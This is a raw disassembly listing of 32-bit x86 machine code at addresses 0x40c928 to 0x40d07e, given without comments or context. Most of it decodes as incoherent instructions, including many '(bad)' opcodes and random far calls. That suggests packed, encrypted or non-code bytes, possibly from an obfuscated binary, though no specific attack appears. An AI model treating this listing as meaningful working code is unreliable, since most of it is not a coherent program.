  40c928:	xchg   esi,eax
  40c929:	jl     0x40c9a7
  40c92b:	retf   0x7c79
  40c92e:	jl     0x40c939
  40c930:	fldcw  WORD PTR [ebx+0x5]
  40c933:	(bad)
  40c936:	sar    DWORD PTR [edi],cl
  40c938:	sub    edx,DWORD PTR [ecx-0x27d7e2fd]
  40c93e:	jne    0x40c937
  40c940:	test   ebp,eax
  40c942:	(bad)  
  40c944:	inc    esp
  40c945:	inc    ecx
  40c946:	jne    0x40c979
  40c948:	xchg   ecx,eax
  40c949:	xor    al,0xa9
  40c94b:	das    
  40c94c:	ja     0x40c9a2
  40c94e:	ds addr16 (bad) 
  40c951:	mov    ebx,edx
  40c953:	mov    al,ds:0xd37785ad
  40c958:	lock add eax,0x8bb2712d
  40c95e:	fsub   DWORD PTR [edi+0x33]
  40c961:	adc    al,0x91
  40c963:	rcl    BYTE PTR [esi+esi*1-0x7cf96663],0x2c
  40c96b:	(bad)  
  40c96c:	nop
  40c96d:	test   eax,0xb56d5f42
  40c972:	xchg   edx,eax
  40c973:	in     eax,0x9b
  40c975:	cwde   
  40c976:	inc    eax
  40c977:	mov    edx,0x48a15c1d
  40c97c:	dec    ecx
  40c97d:	mov    ah,0x22
  40c97f:	jp     0x40c967
  40c981:	mov    ecx,0x89c4adee
  40c986:	xor    bl,BYTE PTR [esi+0x44]
  40c989:	mov    ebp,esi
  40c98b:	or     cl,al
  40c98d:	and    DWORD PTR [eax+eax*1+0x16],edx
  40c991:	sbb    eax,DWORD PTR [eax+0x740e0942]
  40c997:	xor    al,0x54
  40c999:	mov    edi,0xb13a3f3c
  40c99e:	sbb    al,0x85
  40c9a0:	inc    ebp
  40c9a1:	fnstenv [edx]
  40c9a3:	dec    eax
  40c9a4:	xchg   edi,eax
  40c9a5:	pop    ebp
  40c9a6:	jb     0x40c97c
  40c9a8:	call   0xde28:0x60d53c21
  40c9af:	mov    dh,0x54
  40c9b1:	into   
  40c9b2:	pop    eax
  40c9b3:	adc    DWORD PTR [edi],ecx
  40c9b5:	mov    cl,0x48
  40c9b7:	pop    eax
  40c9b8:	sar    DWORD PTR [ecx+eiz*8],cl
  40c9bb:	sbb    eax,0x35199f11
  40c9c0:	push   ds
  40c9c1:	dec    esp
  40c9c2:	cli    
  40c9c3:	je     0x40c9b8
  40c9c5:	xor    al,0x99
  40c9c7:	aad    0xa7
  40c9c9:	retf   
  40c9ca:	cmp    eax,0x11d8ff64
  40c9cf:	jge    0x40ca4a
  40c9d1:	aad    0x49
  40c9d3:	repz jmp 0xfd08:0x620ca6e8
  40c9db:	ss into 
  40c9dd:	mov    BYTE PTR [ebx-0x6f04d37],bl
  40c9e3:	and    DWORD PTR [esi-0x79],eax
  40c9e6:	add    ecx,eax
  40c9e8:	fmul   st(1),st
  40c9ea:	repz jecxz 0x40ca1e
  40c9ed:	data16 cmp al,cl
  40c9f0:	mov    bh,0xb6
  40c9f2:	lods   al,BYTE PTR ds:[esi]
  40c9f3:	shl    BYTE PTR [edx+0x23],0x3a
  40c9f7:	jecxz  0x40c9f3
  40c9f9:	fistp  WORD PTR [esi+0x136e1e75]
  40c9ff:	dec    ebx
  40ca00:	sub    al,0xad
  40ca02:	mov    ah,0x8b
  40ca04:	in     eax,dx
  40ca05:	jnp    0x40c9b4
  40ca07:	mov    ah,0xa3
  40ca09:	jmp    0x40c9d3
  40ca0b:	jmp    0x40c9d2
  40ca0d:	(bad)  
  40ca0f:	or     ebp,DWORD PTR ds:0xac453fe7
  40ca15:	mov    bl,0x3b
  40ca17:	pop    esi
  40ca18:	mov    BYTE PTR [edi+0x28eaa254],dh
  40ca1e:	fsub   QWORD PTR [ebp-0x7b]
  40ca21:	in     eax,dx
  40ca22:	pop    ecx
  40ca23:	outs   dx,BYTE PTR ds:[esi]
  40ca24:	stos   DWORD PTR es:[edi],eax
  40ca25:	mov    eax,0xc6a16741
  40ca2a:	gs jae 0x40ca2e
  40ca2d:	inc    eax
  40ca2e:	or     eax,0xee2fa268
  40ca33:	into   
  40ca34:	inc    edi
  40ca35:	pop    eax
  40ca36:	pushf  
  40ca37:	push   eax
  40ca38:	push   ebp
  40ca39:	shl    BYTE PTR [ebx+edx*2+0x2b],1
  40ca3d:	js     0x40c9fe
  40ca3f:	sub    esp,edx
  40ca41:	int    0x72
  40ca43:	or     eax,0xb9b7098f
  40ca48:	xchg   edi,eax
  40ca49:	in     eax,dx
  40ca4a:	popf   
  40ca4b:	xchg   edx,eax
  40ca4c:	xor    ebp,DWORD PTR [ebx+0x66]
  40ca4f:	jp     0x40caac
  40ca51:	pop    esi
  40ca52:	and    al,0xe8
  40ca54:	dec    edi
  40ca55:	pop    esi
  40ca56:	hlt    
  40ca57:	xor    eax,DWORD PTR [ebp+0x274a44fe]
  40ca5d:	stc    
  40ca5e:	sub    ecx,ebp
  40ca60:	test   eax,0x79618e9d
  40ca65:	xchg   ecx,eax
  40ca66:	scas   eax,DWORD PTR es:[edi]
  40ca67:	mov    eax,ds:0xfb465234
  40ca6c:	(bad)  
  40ca6d:	mov    ?,WORD PTR [eax]
  40ca6f:	xor    esp,DWORD PTR [ebx+0x5e]
  40ca72:	adc    eax,0xe59d038a
  40ca77:	push   ecx
  40ca78:	dec    edi
  40ca79:	push   esp
  40ca7a:	pop    ds
  40ca7b:	cmc    
  40ca7c:	lods   al,BYTE PTR ds:[esi]
  40ca7d:	adc    bl,dl
  40ca7f:	pop    ebp
  40ca80:	cs pop ebx
  40ca82:	pop    esi
  40ca83:	mov    bl,0x9
  40ca85:	adc    edi,DWORD PTR [ecx+0x6e5127c2]
  40ca8b:	inc    eax
  40ca8c:	lock hlt 
  40ca8e:	mov    ecx,0xa6f7cb94
  40ca93:	out    0x5c,eax
  40ca95:	stos   BYTE PTR es:[edi],al
  40ca96:	fild   DWORD PTR [ebx+0x12]
  40ca99:	and    al,0xfc
  40ca9b:	fiadd  WORD PTR ds:0x1d209db0
  40caa1:	add    ebx,edi
  40caa3:	es out 0x2b,al
  40caa6:	das    
  40caa7:	stc    
  40caa8:	push   esp
  40caa9:	repz pop es
  40caab:	sub    eax,0xa3b30bb7
  40cab0:	clc    
  40cab1:	loopne 0x40ca83
  40cab3:	dec    edx
  40cab4:	jle    0x40ca6e
  40cab6:	popa   
  40cab7:	adc    bl,BYTE PTR [eax-0x5991ba6f]
  40cabd:	leave  
  40cabe:	push   cs
  40cabf:	ret    
  40cac0:	(bad)  
  40cac2:	sbb    ecx,ebx
  40cac4:	mov    cl,0xfd
  40cac6:	xchg   esi,eax
  40cac7:	cmp    al,0x9
  40cac9:	test   al,0x34
  40cacb:	leave  
  40cacc:	xor    DWORD PTR [ebx-0x3e],ecx
  40cacf:	pop    eax
  40cad0:	inc    esp
  40cad1:	test   esp,0xdb8e3e8a
  40cad7:	mov    fs,WORD PTR [edx-0x14]
  40cada:	mov    edi,0xa6aec5c2
  40cadf:	xchg   esi,eax
  40cae0:	xchg   ebp,eax
  40cae1:	mov    al,0x1b
  40cae3:	nop
  40cae4:	ffreep st(5)
  40cae6:	fsub   QWORD PTR [edx-0x24b04adf]
  40caec:	push   edx
  40caed:	mov    edx,0x74a0b496
  40caf2:	and    al,0x1a
  40caf4:	rol    BYTE PTR [esi+ebx*1+0x4],cl
  40caf8:	jnp    0x40cad4
  40cafa:	pop    esp
  40cafb:	stos   DWORD PTR es:[edi],eax
  40cafc:	or     DWORD PTR [edi-0x1f86a817],ebx
  40cb02:	scas   eax,DWORD PTR es:[edi]
  40cb03:	xchg   esi,eax
  40cb04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb05:	or     al,BYTE PTR [eax+0x5e57704]
  40cb0b:	mov    ebx,0x85803f0e
  40cb10:	je     0x40cb38
  40cb12:	mov    bh,ch
  40cb14:	gs aad 0x2f
  40cb17:	dec    ebp
  40cb18:	and    eax,0x78ff629f
  40cb1d:	fnstcw WORD PTR [ebx-0x33]
  40cb20:	xor    DWORD PTR [edx],ebp
  40cb22:	loop   0x40caec
  40cb24:	sar    BYTE PTR [eax+ebp*2+0x61992c9b],1
  40cb2b:	mov    edx,0xf617fb79
  40cb30:	push   esp
  40cb31:	ror    BYTE PTR [esi-0x3c9e3a06],cl
  40cb37:	inc    esi
  40cb38:	xor    dh,BYTE PTR [ebx-0x2678ba19]
  40cb3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb3f:	jne    0x40cba7
  40cb41:	shl    edx,0x62
  40cb44:	pushf  
  40cb45:	test   al,0xe2
  40cb47:	pop    esp
  40cb48:	ss inc eax
  40cb4a:	scas   eax,DWORD PTR es:[edi]
  40cb4b:	rcr    al,0x5a
  40cb4e:	sbb    bh,bh
  40cb50:	not    DWORD PTR [edx]
  40cb52:	cmp    cl,BYTE PTR [ecx]
  40cb54:	lock or ch,dh
  40cb57:	cdq    
  40cb58:	pop    ds
  40cb59:	cmp    DWORD PTR [ecx+eax*2],ebp
  40cb5c:	xlat   BYTE PTR ds:[ebx]
  40cb5d:	xchg   edx,esi
  40cb5f:	das    
  40cb60:	scas   al,BYTE PTR es:[edi]
  40cb61:	adc    al,0x78
  40cb63:	in     eax,dx
  40cb64:	mov    ch,0xb7
  40cb66:	in     eax,0xa3
  40cb68:	mov    al,BYTE PTR [bp-0x4a7e]
  40cb6d:	xchg   ebx,eax
  40cb6e:	call   DWORD PTR [edi]
  40cb70:	cli    
  40cb71:	push   esi
  40cb72:	out    0x51,al
  40cb74:	repnz adc ebx,DWORD PTR [eax]
  40cb77:	mov    al,ds:0x123f78a3
  40cb7c:	jl     0x40cbc8
  40cb7e:	ds test bl,0xca
  40cb82:	add    al,0xa8
  40cb84:	stc    
  40cb85:	js     0x40cb3e
  40cb87:	ins    BYTE PTR es:[edi],dx
  40cb88:	jge    0x40cbec
  40cb8a:	or     ebp,DWORD PTR [ebp+0x4f]
  40cb8d:	add    dh,bh
  40cb8f:	add    al,BYTE PTR [ecx-0x6307c7a6]
  40cb95:	adc    DWORD PTR [edx],ebx
  40cb97:	jl     0x40cb72
  40cb99:	push   esi
  40cb9a:	sar    DWORD PTR [edi+0x2b4cc01e],cl
  40cba0:	ss adc cl,al
  40cba3:	add    BYTE PTR [ebx+0x5a],al
  40cba6:	mov    esi,0xf8749011
  40cbab:	mov    ds:0xf1315c1c,al
  40cbb0:	fcom   QWORD PTR [ebx-0x4d7826f5]
  40cbb6:	in     al,0xc4
  40cbb8:	daa    
  40cbb9:	lods   al,BYTE PTR ds:[esi]
  40cbba:	stos   DWORD PTR es:[edi],eax
  40cbbb:	mov    BYTE PTR [eax],0xb7
  40cbbe:	jge    0x40cbec
  40cbc0:	mov    ds:0xe617632d,al
  40cbc5:	sahf   
  40cbc6:	and    DWORD PTR [esi-0xfa19767],edi
  40cbcc:	jge    0x40cb6b
  40cbce:	shl    DWORD PTR [ebp+0x2e],cl
  40cbd1:	sbb    eax,0x781dea00
  40cbd6:	push   0xffffffb8
  40cbd8:	xchg   ecx,eax
  40cbd9:	sti    
  40cbda:	and    ah,ah
  40cbdc:	out    0x46,al
  40cbde:	jecxz  0x40cbf5
  40cbe0:	(bad)  
  40cbe1:	idiv   BYTE PTR [edi+0xe8175d3]
  40cbe7:	mov    ds:0x9f0aaf66,eax
  40cbec:	gs in  eax,0x6c
  40cbef:	or     eax,DWORD PTR [eax]
  40cbf1:	fstp   DWORD PTR [ebx-0x50]
  40cbf4:	les    ebx,FWORD PTR [edx-0x45bb46bd]
  40cbfa:	test   DWORD PTR [ebx+0x62],0xa1f95819
  40cc01:	(bad)  
  40cc02:	adc    edi,esi
  40cc04:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40cc06:	div    DWORD PTR [ebx+0x20]
  40cc09:	mov    edi,0xbe5aceda
  40cc0e:	inc    esi
  40cc0f:	xchg   esp,eax
  40cc10:	data16 scas al,BYTE PTR es:[edi]
  40cc12:	arpl   WORD PTR [ebp+0x3db8eb54],sp
  40cc18:	mov    ah,bh
  40cc1a:	cli    
  40cc1b:	int    0x79
  40cc1d:	mov    bl,0xfa
  40cc1f:	(bad)  
  40cc20:	lds    esp,FWORD PTR [esi]
  40cc22:	shl    esi,1
  40cc24:	dec    edx
  40cc25:	mov    edi,?
  40cc27:	jo     0x40cbcb
  40cc29:	pop    esp
  40cc2a:	gs in  eax,dx
  40cc2c:	add    esp,DWORD PTR [ebx-0x2405a2d]
  40cc32:	cs ret 
  40cc34:	jg     0x40cbb7
  40cc36:	xchg   esi,eax
  40cc37:	pop    edx
  40cc38:	cmc    
  40cc39:	outs   dx,BYTE PTR ds:[esi]
  40cc3a:	adc    cl,ch
  40cc3c:	mov    esp,0x2930c823
  40cc41:	cmp    ah,al
  40cc43:	bound  edx,QWORD PTR ss:[ecx-0x4eb96400]
  40cc4a:	aam    0x27
  40cc4c:	arpl   WORD PTR [edx+0x4a064d62],bx
  40cc52:	idiv   ecx
  40cc54:	daa    
  40cc55:	pushf  
  40cc56:	mov    dl,0x3a
  40cc58:	call   0x56b8421c
  40cc5d:	neg    ebp
  40cc5f:	mov    esp,0xe4ef28fc
  40cc64:	sbb    eax,0xea7a3a7f
  40cc69:	push   ecx
  40cc6a:	xchg   esi,eax
  40cc6b:	push   ebp
  40cc6c:	cmp    eax,DWORD PTR [edi]
  40cc6e:	jmp    0xfc61:0xe2c28983
  40cc75:	add    al,0xeb
  40cc77:	outs   dx,DWORD PTR ds:[esi]
  40cc78:	(bad)  
  40cc79:	pop    edx
  40cc7a:	mov    edi,0x461f3b6
  40cc7f:	in     eax,0xa1
  40cc81:	mov    edx,0x3030cbd
  40cc86:	rol    DWORD PTR [ebx],1
  40cc88:	stc    
  40cc89:	imul   edx,edi
  40cc8c:	add    edx,DWORD PTR [ebp-0x14]
  40cc8f:	mov    DWORD PTR [ebp-0x14],edx
  40cc92:	mov    edx,DWORD PTR [ebp-0xc]
  40cc95:	jmp    0x40d008
  40cc9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc9b:	loopne 0x40cc38
  40cc9d:	mov    ebx,0xe364435b
  40cca2:	mov    ecx,DWORD PTR [esi]
  40cca4:	pop    eax
  40cca5:	push   es
  40cca6:	adc    eax,0x3bc89faf
  40ccab:	xchg   edx,eax
  40ccac:	jl     0x40cd2a
  40ccae:	retf   0x7c79
  40ccb1:	jl     0x40ccff
  40ccb3:	pop    ecx
  40ccb4:	fimul  DWORD PTR [esi-0x6531607a]
  40ccba:	jecxz  0x40cce7
  40ccbc:	mov    bh,0x4b
  40ccbe:	(bad)  
  40ccbf:	stc    
  40ccc0:	xchg   ebp,eax
  40ccc1:	js     0x40ccc0
  40ccc3:	sbb    BYTE PTR [edx+ebx*1],cl
  40ccc6:	jl     0x40cd19
  40ccc8:	call   0x6e2c:0x3f6046c5
  40cccf:	and    al,0x48
  40ccd1:	mov    dh,0x44
  40ccd3:	sbb    edi,DWORD PTR [esi]
  40ccd5:	ss pop esp
  40ccd7:	sbb    BYTE PTR [eax],bh
  40ccd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccda:	inc    eax
  40ccdb:	add    bh,bh
  40ccdd:	or     DWORD PTR [edi-0x6c],eax
  40cce0:	call   DWORD PTR [edi]
  40cce2:	jge    0x40cd34
  40cce4:	lock jl 0x40cd5a
  40cce7:	ja     0x40cd0f
  40cce9:	lods   eax,DWORD PTR ds:[esi]
  40ccea:	loope  0x40cd49
  40ccec:	dec    ecx
  40cced:	fnsave [ebx-0x46]
  40ccf0:	int    0xba
  40ccf2:	jg     0x40cca5
  40ccf4:	mov    BYTE PTR [edx],cl
  40ccf6:	loop   0x40cc92
  40ccf8:	inc    ebx
  40ccf9:	dec    esi
  40ccfa:	jg     0x40cc95
  40ccfc:	stos   BYTE PTR es:[edi],al
  40ccfd:	ds in  ax,0x8b
  40cd01:	sub    BYTE PTR [ecx],bl
  40cd03:	jne    0x40ccd0
  40cd05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd06:	sub    al,BYTE PTR ds:0x622c88a1
  40cd0c:	test   DWORD PTR [edi],eax
  40cd0e:	add    BYTE PTR [edx-0x36],ch
  40cd11:	adc    BYTE PTR [eax],0xd5
  40cd14:	adc    DWORD PTR [esp+eax*2-0x6979e9cf],ecx
  40cd1b:	imul   ecx,eax,0x32c28c08
  40cd21:	scas   al,BYTE PTR es:[edi]
  40cd22:	pop    ds
  40cd23:	inc    BYTE PTR [edx+0x5726700e]
  40cd29:	in     al,0xfb
  40cd2b:	ret    0xf430
  40cd2e:	outs   dx,DWORD PTR ds:[esi]
  40cd2f:	sub    eax,0x1abc845a
  40cd34:	mov    ds:0xb13ec866,al
  40cd39:	es dec edi
  40cd3b:	imul   edi,DWORD PTR [edx+0x6c],0x6dc1fcc8
  40cd42:	mov    ebx,0xfa157f89
  40cd47:	ins    BYTE PTR es:[edi],dx
  40cd48:	mov    dl,BYTE PTR [edx+0x7b1f048c]
  40cd4e:	jg     0x40ccf8
  40cd50:	or     al,0x56
  40cd52:	mov    WORD PTR [ebx-0x2e],es
  40cd55:	mov    bh,0x9e
  40cd57:	lds    esp,FWORD PTR [edx-0x58]
  40cd5a:	jmp    0x40cd91
  40cd5c:	sub    al,0x2b
  40cd5e:	mov    cl,0x8e
  40cd60:	arpl   WORD PTR [eax+0x3a34e1fc],sp
  40cd66:	int3   
  40cd67:	jmp    0x40cd3c
  40cd69:	jmp    0xb72bba96
  40cd6e:	cwde   
  40cd6f:	fist   DWORD PTR [ebx]
  40cd71:	xchg   esi,eax
  40cd72:	fld    TBYTE PTR [edx]
  40cd74:	cwde   
  40cd75:	out    dx,al
  40cd76:	sar    BYTE PTR [eax],0xae
  40cd79:	inc    eax
  40cd7a:	pop    esi
  40cd7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd7c:	cmp    al,0xb5
  40cd7e:	adc    DWORD PTR [edx+ebx*4-0x70],ecx
  40cd82:	pop    eax
  40cd83:	inc    ebp
  40cd84:	in     eax,0x6f
  40cd86:	(bad)  
  40cd87:	gs xchg edx,eax
  40cd89:	push   ds
  40cd8a:	jb     0x40cdaf
  40cd8c:	inc    esi
  40cd8d:	ins    DWORD PTR es:[edi],dx
  40cd8e:	push   edx
  40cd8f:	push   edx
  40cd90:	jb     0x40ce0b
  40cd92:	xor    dh,BYTE PTR [ecx-0x1b38fa2b]
  40cd98:	fwait
  40cd99:	push   ebp
  40cd9a:	pop    esi
  40cd9b:	add    eax,0x7fca4825
  40cda0:	mov    edx,0x75c17d39
  40cda5:	sar    DWORD PTR [edi+0x78aab6e3],cl
  40cdab:	xlat   BYTE PTR ds:[ebx]
  40cdac:	out    dx,al
  40cdad:	aad    0xbb
  40cdaf:	cmp    edx,DWORD PTR [ecx]
  40cdb1:	push   edx
  40cdb2:	ret    0xea49
  40cdb5:	mov    eax,ds:0xebae1def
  40cdba:	cli    
  40cdbb:	mov    eax,ds:0xd5e130f7
  40cdc0:	leave  
  40cdc1:	daa    
  40cdc2:	or     esi,DWORD PTR [esi+ebp*8-0x7835a533]
  40cdc9:	mov    esp,0x5f60c315
  40cdce:	cli    
  40cdcf:	add    DWORD PTR [edx+eiz*1-0x6029e798],ecx
  40cdd6:	(bad)  
  40cdd8:	shl    BYTE PTR [eax+0x7a],1
  40cddb:	(bad)  
  40cddc:	fdivr  QWORD PTR [esi]
  40cdde:	dec    esp
  40cddf:	(bad)  
  40cde0:	out    dx,al
  40cde1:	loope  0x40cdd8
  40cde3:	mov    ebx,0x5237fc46
  40cde8:	outs   dx,BYTE PTR ds:[esi]
  40cde9:	pop    edx
  40cdea:	int    0xe4
  40cdec:	dec    eax
  40cded:	lods   eax,DWORD PTR ds:[esi]
  40cdee:	call   0x8980f639
  40cdf3:	ja     0x40ce55
  40cdf5:	fnstsw WORD PTR [esi-0x5655c757]
  40cdfb:	out    dx,al
  40cdfc:	sub    eax,0x9a37c8de
  40ce01:	pop    edi
  40ce02:	dec    eax
  40ce03:	je     0x40cdc1
  40ce05:	push   esi
  40ce06:	inc    esi
  40ce07:	fild   QWORD PTR cs:[ebx]
  40ce0a:	and    bl,bh
  40ce0c:	pusha  
  40ce0d:	rcl    DWORD PTR [edi+0x5f],0x70
  40ce11:	sbb    eax,0x81770ca8
  40ce16:	cmp    eax,0xd369a09f
  40ce1b:	call   0x36856d7f
  40ce20:	sbb    ebx,esp
  40ce22:	mov    ebp,0xb3489d20
  40ce27:	push   edi
  40ce28:	neg    DWORD PTR [eax+0x36]
  40ce2b:	lods   eax,DWORD PTR ds:[esi]
  40ce2c:	lds    esp,FWORD PTR ds:[ebp+0x74]
  40ce30:	mov    bh,0xd8
  40ce32:	out    0xa9,al
  40ce34:	mov    ebp,0x72fc5541
  40ce39:	pop    edi
  40ce3a:	out    0x79,eax
  40ce3c:	mov    ds:0x7da0d296,eax
  40ce41:	in     eax,0xbd
  40ce43:	loopne 0x40ce5d
  40ce45:	ins    DWORD PTR es:[edi],dx
  40ce46:	in     eax,0xf9
  40ce48:	xor    BYTE PTR [edi+0x4f],ch
  40ce4b:	xor    ah,BYTE PTR [ebp+0x43e1d691]
  40ce51:	ret    0x7cd2
  40ce54:	clc    
  40ce55:	pusha  
  40ce56:	mov    cl,0xad
  40ce58:	pop    ecx
  40ce59:	mov    bh,0xc7
  40ce5b:	leave  
  40ce5c:	adc    al,0x37
  40ce5e:	call   0xbb9b:0x8eb0da62
  40ce65:	mov    esi,0x578624f2
  40ce6a:	clc    
  40ce6b:	or     BYTE PTR [esi+0x4f],0x5
  40ce6f:	inc    esp
  40ce70:	pushf  
  40ce71:	or     DWORD PTR [ebx+0x13],edi
  40ce74:	lds    ecx,FWORD PTR [esi-0x45e12845]
  40ce7a:	adc    ch,ch
  40ce7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce7d:	call   0x51d4:0x7d57e63a
  40ce84:	idiv   cl
  40ce86:	enter  0x3778,0x80
  40ce8a:	inc    esi
  40ce8b:	mov    BYTE PTR [ecx],dh
  40ce8d:	push   es
  40ce8e:	mov    ch,0xa
  40ce90:	outs   dx,DWORD PTR ds:[esi]
  40ce91:	ds out 0x61,eax
  40ce94:	fisttp DWORD PTR [edi-0x65]
  40ce97:	inc    esi
  40ce98:	js     0x40ce8e
  40ce9a:	jns    0x40ce21
  40ce9c:	cmp    eax,0xb739e087
  40cea1:	dec    esp
  40cea2:	pop    eax
  40cea3:	adc    al,0xeb
  40cea5:	jne    0x40ce4e
  40cea7:	cmp    DWORD PTR [eax+0x3081abff],0xdc2970e1
  40ceb1:	pop    es
  40ceb2:	mov    al,0xc2
  40ceb4:	xchg   ecx,eax
  40ceb5:	jg     0x40ce76
  40ceb7:	ins    BYTE PTR es:[edi],dx
  40ceb8:	les    esi,FWORD PTR [ebp+0x12]
  40cebb:	clc    
  40cebc:	or     DWORD PTR [ebx+0x43e4787b],0xe17430cb
  40cec6:	into   
  40cec7:	gs out dx,al
  40cec9:	and    DWORD PTR [ecx-0x7ab1455a],ebp
  40cecf:	fist   DWORD PTR [ebx+eiz*1+0x1]
  40ced3:	rcr    DWORD PTR [eax],1
  40ced5:	aam    0x39
  40ced7:	pop    edx
  40ced8:	push   eax
  40ced9:	sbb    ebp,edx
  40cedb:	stos   DWORD PTR es:[edi],eax
  40cedc:	cmc    
  40cedd:	mov    DWORD PTR [bx+0x29],edi
  40cee1:	xchg   ebp,eax
  40cee2:	ins    BYTE PTR es:[edi],dx
  40cee3:	xchg   ebx,eax
  40cee4:	sbb    al,0x5b
  40cee6:	clc    
  40cee7:	cdq    
  40cee8:	mov    ecx,0xb5978e1e
  40ceed:	mov    ebp,0xf437e7fc
  40cef2:	movd   esi,mm5
  40cef5:	enter  0xf32e,0xda
  40cef9:	repnz sbb eax,0xd65675f5
  40ceff:	cmc    
  40cf00:	and    cl,BYTE PTR [esi]
  40cf02:	adc    eax,0x7276acc2
  40cf07:	ficom  DWORD PTR [ecx]
  40cf09:	test   eax,0x41ede36d
  40cf0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf0f:	sub    ebp,DWORD PTR [edx]
  40cf11:	pusha  
  40cf12:	popf   
  40cf13:	mov    ecx,edx
  40cf15:	icebp  
  40cf16:	mov    DWORD PTR [edx],ecx
  40cf18:	retf   
  40cf19:	or     DWORD PTR [eax-0x399b0672],ecx
  40cf1f:	push   ss
  40cf20:	lods   al,BYTE PTR ds:[esi]
  40cf21:	cmp    edi,0x51ae2b16
  40cf27:	and    esp,eax
  40cf29:	leave  
  40cf2a:	jl     0x40cf74
  40cf2c:	push   edi
  40cf2d:	les    esp,FWORD PTR ds:0xc36a804a
  40cf33:	cld    
  40cf34:	sub    eax,0x60daf7a0
  40cf39:	dec    esp
  40cf3a:	(bad)  [edi]
  40cf3c:	pop    esi
  40cf3d:	dec    ecx
  40cf3e:	ficom  DWORD PTR [esi]
  40cf40:	push   eax
  40cf41:	dec    ebx
  40cf42:	leave  
  40cf43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf44:	add    eax,0x769ed11
  40cf49:	test   BYTE PTR [ecx-0x4a],bl
  40cf4c:	imul   ecx,ebp,0x1a
  40cf4f:	xchg   ecx,eax
  40cf50:	xor    WORD PTR [esi-0x65de784a],ax
  40cf57:	add    eax,DWORD PTR [edi-0x37df940a]
  40cf5d:	fwait
  40cf5e:	mov    bl,0xf5
  40cf60:	jne    0x40cefd
  40cf62:	add    edi,DWORD PTR [ecx+0x6067e545]
  40cf68:	mov    ds:0x6f26395d,al
  40cf6d:	not    BYTE PTR [edi+0xa17246]
  40cf73:	iret   
  40cf74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf75:	xchg   ebx,eax
  40cf76:	and    esi,esi
  40cf78:	sub    eax,0x35dedcf7
  40cf7d:	jo     0x40cfaf
  40cf7f:	bound  edx,QWORD PTR [ebx-0x4b3b8e9b]
  40cf85:	test   al,0x78
  40cf87:	inc    esp
  40cf88:	jecxz  0x40d007
  40cf8a:	(bad)  
  40cf8b:	push   esp
  40cf8c:	inc    ebp
  40cf8d:	adc    BYTE PTR [esi+edi*2-0x4c88f7fa],0xf7
  40cf95:	pop    edx
  40cf96:	retf   0x7cde
  40cf99:	ret    
  40cf9a:	add    dh,BYTE PTR [eax]
  40cf9c:	sar    BYTE PTR [ebp-0x600074ab],cl
  40cfa2:	lods   al,BYTE PTR ds:[esi]
  40cfa3:	add    BYTE PTR [ebp-0x46],bl
  40cfa6:	bound  esi,QWORD PTR [ebp+ebp*2-0x7]
  40cfaa:	inc    ebx
  40cfab:	inc    ebx
  40cfac:	pop    eax
  40cfad:	fxtract 
  40cfaf:	iret   
  40cfb0:	add    DWORD PTR [eax-0x6a],0x33b99cdc
  40cfb7:	mov    ah,0xa1
  40cfb9:	in     eax,dx
  40cfba:	cmp    dl,dh
  40cfbc:	add    esp,DWORD PTR [esi+eiz*8+0x24]
  40cfc0:	sub    bl,dl
  40cfc2:	mov    cl,0xf6
  40cfc4:	retf   
  40cfc5:	pop    ebp
  40cfc6:	cmp    BYTE PTR [ebx+0x3456fa7a],0x7f
  40cfcd:	sub    ah,BYTE PTR [esi+0x2a2b708e]
  40cfd3:	not    DWORD PTR [ebp+0x34]
  40cfd6:	cmp    BYTE PTR [edi+0xa4a3266],ch
  40cfdc:	adc    eax,0xc32b3dd1
  40cfe1:	push   edx
  40cfe2:	push   ds
  40cfe3:	xlat   BYTE PTR ds:[ebx]
  40cfe4:	jo     0x40cf77
  40cfe6:	xlat   BYTE PTR ds:[ebx]
  40cfe7:	ds enter 0x7fb5,0x43
  40cfec:	ja     0x40cfe5
  40cfee:	ja     0x40d06a
  40cff0:	mov    edx,0x3d5aac8b
  40cff5:	jmp    0xabf93e03
  40cffa:	mov    bl,0x1b
  40cffc:	mov    cl,0x82
  40cffe:	or     BYTE PTR [ebx+esi*1-0x2a],ch
  40d002:	sbb    edi,DWORD PTR [edx+0x2a53fc9c]
  40d008:	mov    edi,DWORD PTR [ebp-0x24]
  40d00b:	xor    edx,eax
  40d00d:	add    edx,ecx
  40d00f:	imul   edx,edi
  40d012:	jmp    0x40d385
  40d017:	retf   
  40d018:	jo     0x40cff3
  40d01a:	or     ah,BYTE PTR [ecx-0x63]
  40d01d:	jmp    0x40d09c
  40d01f:	sahf   
  40d020:	xor    dl,dh
  40d022:	ins    BYTE PTR es:[edi],dx
  40d023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d024:	mov    ecx,0x9f91b894
  40d029:	jl     0x40d0a7
  40d02b:	retf   0x7c79
  40d02e:	jl     0x40d00b
  40d030:	sub    al,0x2
  40d032:	sbb    al,0x9d
  40d034:	(bad)
  40d037:	inc    ecx
  40d038:	retf   0x510f
  40d03b:	pushfw 
  40d03d:	mov    al,0x94
  40d03f:	mov    edi,0x695458a7
  40d044:	pop    edi
  40d045:	push   esi
  40d046:	sbb    eax,0x4ab16260
  40d04b:	cmp    BYTE PTR [ebx+ebx*8+0x48],al
  40d04f:	into   
  40d050:	cmp    dl,BYTE PTR fs:[ebx]
  40d053:	add    DWORD PTR ds:0xf787b139,ebx
  40d059:	xor    BYTE PTR [edx+0x22fd193a],0x32
  40d060:	xor    dh,BYTE PTR [edi]
  40d062:	push   0xe55ca1a8
  40d067:	ins    BYTE PTR es:[edi],dx
  40d068:	js     0x40d0af
  40d06a:	cdq    
  40d06b:	cwde   
  40d06c:	inc    esp
  40d06d:	ja     0x40d0b4
  40d06f:	mov    bl,0x42
  40d071:	lahf   
  40d072:	fcmove st,st(3)
  40d074:	mov    BYTE PTR [eax+0x1de09e6e],ch
  40d07a:	out    0x63,eax
  40d07c:	push   esp
  40d07d:	popf   
  40d07e:	and    al,0x45
